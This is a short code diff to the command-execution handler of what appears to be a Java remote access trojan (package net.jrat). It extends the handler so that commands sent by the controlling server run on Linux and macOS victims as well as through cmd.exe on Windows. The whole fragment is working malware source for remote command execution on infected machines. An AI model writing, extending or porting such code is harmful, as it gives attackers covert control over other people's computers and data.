@@ -4,8 +4,10 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 import net.jrat.core.Client;
+import net.jrat.core.connection.OS;
 import net.jrat.core.packet.IPacket;
 import net.jrat.core.packet.client.C1PacketMessage;
+import net.jrat.utils.Variables;
 
 public class S3PacketExecute implements IPacket
 {
@@ -19,7 +21,13 @@ public class S3PacketExecute implements IPacket
 		try
 		{
 			final Runtime runtime = Runtime.getRuntime();
-			final Process process = runtime.exec(new String[] { "cmd.exe", "/c", this.command });
+			
+			Process process;
+			if(Variables.instance.operatingSystem == OS.WINDOWS)
+				process = runtime.exec(new String[] { "cmd.exe", "/c", this.command });
+			else
+				process = runtime.exec(this.command);
+			
 			
 			new Thread(new Runnable()
 			{
